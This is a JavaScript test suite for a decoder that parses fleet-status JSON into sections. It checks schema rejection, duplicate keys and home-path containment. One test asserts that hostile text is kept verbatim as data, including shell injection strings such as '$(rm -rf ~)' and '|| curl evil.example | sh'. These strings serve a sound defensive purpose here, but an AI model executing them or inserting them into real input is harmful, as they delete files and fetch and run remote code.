import { test } from "node:test";
import assert from "node:assert/strict";
import { decodeBearings, homeLabel, BEARINGS_SCHEMA, SECTIONS } from "../mods/firstmate-fleet/decode.js";
import { fixture, fixtureText, HOME, RECEIVED } from "./helpers.mjs";

const decode = (name, home = HOME) => decodeBearings(fixtureText(name), home, RECEIVED);
const decodeObj = (obj, home = HOME) => decodeBearings(JSON.stringify(obj), home, RECEIVED);
const ids = (rows) => rows.map((r) => r.id);

test("home label is the last two path segments, as Bearings computes it", () => {
  assert.equal(homeLabel("/home/captain/firstmate"), "captain/firstmate");
  assert.equal(homeLabel("/firstmate"), "/firstmate");
  assert.equal(BEARINGS_SCHEMA, "fm-bearings.v1");
  assert.deepEqual(SECTIONS, ["captain_call", "underway", "landed", "charted_next", "unhealthy"]);
});

test("P01: an empty valid model decodes with no rows and keeps its disclosures", () => {
  const r = decode("empty");
  assert.equal(r.ok, true);
  for (const s of SECTIONS) assert.deepEqual(r.model.rows[s], []);
  assert.equal(r.model.homeCheck, "label-only");
  assert.equal(r.model.disclosures.length, 0);
  assert.equal(r.model.notRequested.length, 4);
  assert.equal(r.model.receivedAtMs, RECEIVED);
  assert.equal(r.model.generatedAt, "2026-10-30T12:00:00Z");
  assert.equal(r.model.generatedMs, Date.parse("2026-10-30T12:00:00Z"));
});

test("P02: rows land in Bearings' sections, in Bearings' order, with raw state", () => {
  const { model } = decode("normal");
  assert.deepEqual(ids(model.rows.captain_call), ["pick-db"]);
  assert.deepEqual(ids(model.rows.underway), ["fix-login", "scout-cache", "mate-a/docs-sweep"]);
  assert.deepEqual(ids(model.rows.landed), ["bump-deps", "mate-a/typo"]);
  assert.deepEqual(ids(model.rows.charted_next), ["add-metrics"]);
  assert.deepEqual(model.rows.unhealthy, []);
  const [login, scout] = model.rows.underway;
  assert.equal(login.state, "working");
  assert.equal(login.title, "Fix login redirect loop");
  assert.equal(login.detail, "running tests");
  assert.equal(login.kind, "ship");
  assert.equal(login.repo, "acme/webapp");
  assert.equal(scout.state, "unknown");
  assert.equal(scout.detail, null, "an empty doing string is absent");
  assert.equal(model.homeCheck, "paths");
});

test("P02: captain call rows carry owner and verb; landed rows carry their artifact", () => {
  const { model } = decode("normal");
  const call = model.rows.captain_call[0];
  assert.equal(call.owner, "(main)");
  assert.equal(call.detail, "captain-hold");
  assert.equal(call.title, "Choose session store: Redis or Postgres?");
  const [deps, typo] = model.rows.landed;
  assert.deepEqual(deps.artifacts, [{ kind: "artifact", value: "https://github.com/acme/webapp/pull/41" }]);
  assert.equal(typo.owner, "mate-a");
  assert.deepEqual(typo.artifacts, [], "a '-' artifact is absent");
});

test("P07: endpoint evidence is attached by exact id and unknown stays unknown", () => {
  const { model } = decode("normal");
  const [login, scout, child] = model.rows.underway;
  assert.deepEqual(login.endpoint, { backend: "hc", target: "default:t7", exists: true, agent: "not_checked" });
  assert.deepEqual(scout.endpoint, { backend: "tmux", target: null, exists: null, agent: "not_checked" });
  assert.equal(child.endpoint, null, "secondmate children have no main-home endpoint row");
});

test("artifacts and recorded paths join by exact id only", () => {
  const { model } = decode("normal");
  const [login, scout] = model.rows.underway;
  assert.deepEqual(login.artifacts, [{ kind: "pr", value: "https://github.com/acme/webapp/pull/42" }]);
  assert.deepEqual(scout.artifacts, [{ kind: "report", value: "/home/captain/firstmate/data/scout-cache/report.md" }]);
  assert.equal(login.paths.status, "/home/captain/firstmate/state/fix-login.status");
  assert.equal(login.paths.home, null);
  const gate = model.rows.charted_next[0];
  assert.equal(gate.blockedBy, "fix-login");
  assert.equal(gate.detail, null, "a '-' reason is absent");
  assert.equal(gate.filed, "2026-10-29");
  assert.equal(gate.warning, false);
});

test("P03: only Bearings' decisions_open becomes Captain's Call; a parked needs-decision task does not", () => {
  const { model } = decode("holds");
  assert.deepEqual(ids(model.rows.captain_call), ["pick-db", "mate-a/release-notes"]);
  assert.equal(model.rows.captain_call[1].owner, "mate-a");
  assert.deepEqual(ids(model.rows.underway), ["ask-api"]);
  assert.equal(model.rows.underway[0].state, "parked");
  const gates = model.rows.charted_next;
  assert.deepEqual(ids(gates), ["(return-catchup)", "(main-inventory)", "schema-change", "vendor-contract", "pricing"]);
  assert.deepEqual(gates.map((g) => g.warning), [true, true, false, false, false]);
  assert.equal(gates[3].detail, "until 2026-11-15: waiting on vendor");
});

test("P04: cached and unreadable secondmates keep provenance, freshness and null age", () => {
  const { model } = decode("cached-secondmate");
  const [b, c] = model.secondmates;
  assert.equal(b.freshness, "cached");
  assert.equal(b.provenance, "remote-ledger-cache");
  assert.equal(b.sourceAgeSeconds, 1800);
  assert.equal(b.contradiction, false);
  assert.equal(b.reason, null);
  assert.equal(c.sourceAgeSeconds, null, "a missing age is not zero");
  assert.equal(c.reason, "home summary unavailable: ssh exit 255");
  assert.deepEqual(model.disclosures.map((d) => d.surface), ["secondmate mate-b served from cached home ledger"]);
});

test("P06: wrong, old and malformed documents are rejected, never decoded as an empty fleet", () => {
  assert.equal(decode("old-schema").code, "unsupported-schema");
  assert.match(decode("old-schema").message, /fm-fleet-snapshot\.v1/);
  assert.equal(decodeBearings("not json", HOME, RECEIVED).code, "invalid-json");
  assert.equal(decodeBearings("[]", HOME, RECEIVED).code, "invalid-shape");
  assert.equal(decodeBearings(null, HOME, RECEIVED).code, "invalid-output");
  const base = fixture("empty");
  assert.equal(decodeObj({ ...base, generated: "yesterday" }).code, "invalid-generated");
  assert.equal(decodeObj({ ...base, generated: "2026-13-45T99:00:00Z" }).code, "invalid-generated");
  for (const name of ["in_flight", "secondmates", "secondmate_reconcile", "decisions_open", "landed", "gates", "reports", "recorded_prs", "omitted", "paths", "endpoints"]) {
    const doc = { ...base };
    delete doc[name];
    const r = decodeObj(doc);
    assert.equal(r.code, "missing-surface", name);
    assert.match(r.message, new RegExp(name));
  }
  assert.equal(decodeObj({ ...base, contributions: [] }).code, "missing-surface");
  assert.equal(decodeObj({ ...base, unhealthy_endpoints: {} }).code, "missing-surface");
});

test("P08: duplicate keys stay separate and are disclosed; mate children never merge with main ids", () => {
  const { model } = decode("duplicate");
  const rows = model.rows.underway;
  assert.equal(rows.length, 3);
  assert.equal(rows[0].ambiguous, true);
  assert.equal(rows[1].ambiguous, true);
  assert.equal(rows[2].ambiguous, false);
  assert.equal(new Set(rows.map((r) => r.key)).size, 3, "keys stay unique for selection");
  assert.deepEqual(model.decodeIssues.filter((i) => i.code === "duplicate-key"), [{ code: "duplicate-key", message: "underway: 2 rows share a key", count: 2 }]);
  assert.notEqual(model.rows.captain_call[0].key, rows[0].key, "same id in another section is another key");
});

test("keys are JSON-encoded tuples", () => {
  const { model } = decode("normal");
  assert.equal(model.rows.underway[0].key, JSON.stringify(["underway", "", "fix-login"]));
  assert.equal(model.rows.landed[1].key, JSON.stringify(["landed", "mate-a", "mate-a/typo"]));
});

test("P10: bounds stay visible; only exact surface/reveal pairs are 'not requested'", () => {
  const { model } = decode("partial");
  assert.deepEqual(model.disclosures.map((d) => d.surface), [
    "reports showing 20 of 30",
    "decisions_open showing 20 of 25",
    "registered secondmates omitted by snapshot bound: 3",
  ]);
  assert.equal(model.notRequested.length, 4);
  assert.ok(model.disclosures.some((d) => d.reveal === "--all-reports"), "a real truncation sharing --all-reports is not hidden");
});

test("P10: malformed rows are dropped and counted; valid rows survive", () => {
  const { model } = decode("partial");
  assert.deepEqual(ids(model.rows.underway), ["fix-login"]);
  assert.deepEqual(model.rows.landed, []);
  const issues = Object.fromEntries(model.decodeIssues.map((i) => [i.message, i.count]));
  assert.equal(issues["in_flight: rows without a string id or not objects"], 2);
  assert.equal(issues["landed: rows without a string id or not objects"], 1);
  assert.equal(issues["omitted: entries that are not {surface, reveal}"], 1);
  assert.deepEqual(model.rows.unhealthy.map((r) => [r.id, r.endpoint.exists, r.endpoint.agent]), [["old-scout", false, "not_checked"]]);
});

test("P11: hostile text is preserved verbatim as data", () => {
  const { model } = decode("hostile");
  const [shell, uni] = model.rows.underway;
  assert.equal(shell.title, "$(rm -rf ~) `reboot` '; kill -9 1; '");
  assert.equal(shell.detail, "bin/fm-send.sh fm-shell-1 '<instruction>'");
  assert.equal(uni.repo, "acme/国际化");
  assert.equal(uni.title, "修复登录 🚀 — ÄÖÜ");
  assert.equal(model.rows.charted_next[0].detail, "|| curl evil.example | sh");
});

test("P11: a huge title is kept whole in the model", () => {
  const doc = fixture("empty");
  const title = "x".repeat(20000);
  doc.in_flight = [{ id: "big", kind: "ship", state: "working", repo: null, name: title, doing: "" }];
  const { model } = decodeObj(doc);
  assert.equal(model.rows.underway[0].title.length, 20000);
});

test("P15/P19: the home label must match and status paths must sit under the configured home", () => {
  assert.equal(decode("normal", "/home/other/firstmate").code, "home-mismatch");
  const r = decode("redirected-state");
  assert.equal(r.ok, false);
  assert.equal(r.code, "home-mismatch");
  assert.match(r.message, /\/home\/other\/firstmate\/state\/other-task\.status/);
  assert.match(r.message, /\/home\/captain\/firstmate\/state\//);
});

test("a prefix that only shares characters with the home is not under it", () => {
  const doc = fixture("normal");
  doc.paths[0].status = "/home/captain/firstmate-evil/state/fix-login.status";
  assert.equal(decodeObj(doc).code, "home-mismatch");
});

test("unknown additive fields are ignored", () => {
  const doc = fixture("normal");
  doc.future_surface = { anything: true };
  doc.in_flight[0].future_field = "ignored";
  assert.equal(decodeObj(doc).ok, true);
});

test("an absent unhealthy_endpoints means none were reported", () => {
  const { model } = decode("normal");
  assert.deepEqual(model.rows.unhealthy, []);
});

test("the prs note is kept for the header", () => {
  assert.equal(decode("normal").model.prs, "not requested (pass --include-prs for live GitHub discovery)");
});
